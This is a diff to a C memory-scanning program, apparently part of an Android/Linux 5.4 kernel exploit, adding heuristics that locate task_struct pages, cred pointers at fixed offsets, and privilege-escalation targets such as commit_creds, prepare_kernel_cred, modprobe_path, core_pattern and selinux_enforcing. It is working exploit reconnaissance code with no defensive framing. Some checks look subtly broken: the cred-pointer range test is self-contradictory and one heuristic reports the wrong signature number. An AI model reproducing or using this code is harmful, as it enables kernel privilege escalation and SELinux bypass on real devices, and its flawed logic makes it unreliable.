@@ -675,6 +675,168 @@ int main(int argc, char **argv) {
                             found_off = 0;
                         }
                     }
+                    // 13. task_struct on Linux 5.4 — page has BOTH a
+                    //     kernel pointer at one of the well-known
+                    //     task_struct.stack offsets (0x30, 0x38)
+                    //     AND a low-value u32 at a likely __state /
+                    //     usage / pid slot. The u32 must look like a
+                    //     plausible kernel state (0..16) or pid (0..0x8000).
+                    if (!found_sig) {
+                        for (int base = 0; base < 0x400; base += 0x100) {
+                            // Check stack pointer at base+0x30
+                            if (base + 0x40 > PAGE_SIZE) break;
+                            uint64_t stack_ptr;
+                            memcpy(&stack_ptr, buf + base + 0x30, 8);
+                            int stack_ok = (stack_ptr >> 32) >= 0xffffff80
+                                        && (stack_ptr >> 40) <= 0xffffffcf
+                                        && stack_ptr != 0;
+                            if (!stack_ok) continue;
+                            // Check __state at base+0x28 (0=running, 4=stopped, etc)
+                            uint32_t state_v;
+                            memcpy(&state_v, buf + base + 0x28, 4);
+                            int state_ok = state_v < 0x100;
+                            // Check usage refcount at base+0x38
+                            uint32_t usage_v;
+                            memcpy(&usage_v, buf + base + 0x38, 4);
+                            int usage_ok = usage_v > 0 && usage_v < 0x10000;
+                            if (state_ok && usage_ok) {
+                                found_sig = 13;
+                                found_off = base;
+                                break;
+                            }
+                            // Or check pid/tgid at base+0x570 (5.4 layout)
+                            if (base + 0x580 <= PAGE_SIZE) {
+                                uint32_t pid_v;
+                                memcpy(&pid_v, buf + base + 0x570, 4);
+                                if (pid_v < 0x8000) {
+                                    found_sig = 13;
+                                    found_off = base;
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                    // 14. cred pointer in a task_struct — kernel pointer
+                    //     at one of the well-known cred/real_cred
+                    //     offsets (0x6a0, 0x768, 0x770, 0x7c0 in 5.4).
+                    //     We require the pointer to look like a cred
+                    //     struct (i.e. point to a plausible kmalloc
+                    //     area, not kernel .text). On AArch64 cred
+                    //     pointers live in the 0xffffff80..0xffffffcf
+                    //     range and are typically >= 0xffffffe0_xxxx_xxxx.
+                    if (!found_sig) {
+                        const int cred_offs[] = {0x6a0, 0x768, 0x770, 0x7c0};
+                        int found_in_loop = 0;
+                        for (int oi = 0;
+                             oi < (int)(sizeof(cred_offs)/sizeof(cred_offs[0]))
+                             && !found_in_loop;
+                             oi++) {
+                            int off = cred_offs[oi];
+                            if (off + 8 > PAGE_SIZE) continue;
+                            uint64_t cred_ptr;
+                            memcpy(&cred_ptr, buf + off, 8);
+                            int ok = (cred_ptr >> 32) >= 0xffffffe0
+                                  && (cred_ptr >> 40) <= 0xffffffcf
+                                  && (cred_ptr & 0xFFFF) != 0;
+                            if (ok) {
+                                // Also check that comm-ish ASCII is
+                                // somewhere in the page so we know
+                                // it's a real task_struct.
+                                for (int ci = 0; ci + 4 < PAGE_SIZE; ci++) {
+                                    int run = 0, best = 0;
+                                    for (int k = 0;
+                                         k < 16 && ci + k < PAGE_SIZE;
+                                         k++) {
+                                        uint8_t c = buf[ci + k];
+                                        if (0x20 <= c && c <= 0x7e) {
+                                            run++; best = k;
+                                        } else {
+                                            if (run >= 4) break;
+                                            run = 0;
+                                        }
+                                    }
+                                    if (run >= 4) {
+                                        found_sig = 14;
+                                        found_off = off;
+                                        found_in_loop = 1;
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    // 15. Process state page — u32 process state at
+                    //     possible offsets 0x28, 0x40, 0x68, 0x108
+                    //     AND plausible pid in next 0x80 bytes. Real
+                    //     processes have state in 0..16 and pid in
+                    //     0..0x8000.
+                    if (!found_sig) {
+                        int state_hits = 0;
+                        int best_off = -1;
+                        for (int off = 0; off + 0x40 < PAGE_SIZE; off += 4) {
+                            uint32_t s;
+                            memcpy(&s, buf + off, 4);
+                            if (s == 0 || s == 1 || s == 4 || s == 8 ||
+                                s == 16 || s == 32 || s == 64) {
+                                // Check pid in next 0x80 bytes
+                                for (int k = 4; k < 0x80 && off + k + 4 < PAGE_SIZE; k += 4) {
+                                    uint32_t p;
+                                    memcpy(&p, buf + off + k, 4);
+                                    if (p > 0 && p < 0x8000) {
+                                        state_hits++;
+                                        if (best_off < 0) best_off = off;
+                                        break;
+                                    }
+                                }
+                            }
+                            if (state_hits >= 2) {
+                                found_sig = 15;
+                                found_off = best_off;
+                                break;
+                            }
+                        }
+                    }
+                    // 16. Kernel globals — strings we know live
+                    //     somewhere in kernel .rodata or .data.
+                    //     These are stable string literals that the
+                    //     v6.c engine also matches. We re-list them
+                    //     so our engine has its own copy of the
+                    //     pattern set.
+                    if (!found_sig) {
+                        static const char *kglobals[] = {
+                            "selinux_enforcing",
+                            "kptr_restrict",
+                            "selinux_enabled",
+                            "kgsl-3d0",
+                            "modprobe_path",
+                            "core_pattern",
+                            "poweroff_cmd",
+                            "init_cred",
+                            "slub",
+                            "cred_jar",
+                            "task_struct",
+                            "kmem_cache",
+                            "mdss_fb",
+                            "init_cred_cache",
+                            "do_group_exit",
+                            "commit_creds",
+                            "prepare_kernel_cred",
+                            "override_creds",
+                            "revert_creds",
+                            "abort_creds",
+                        };
+                        for (size_t gi = 0;
+                             gi < sizeof(kglobals)/sizeof(kglobals[0]);
+                             gi++) {
+                            int glen = (int)strlen(kglobals[gi]);
+                            void *gp = memmem(buf, PAGE_SIZE, kglobals[gi], glen);
+                            if (gp) {
+                                found_sig = 8;
+                                found_off = (int)((uint8_t*)gp - buf);
+                                break;
+                            }
+                        }
+                    }
 
                     if (found_sig) {
                         printf("MATCH:%lx:%d:%d\n", (unsigned long)va, found_sig, found_off);
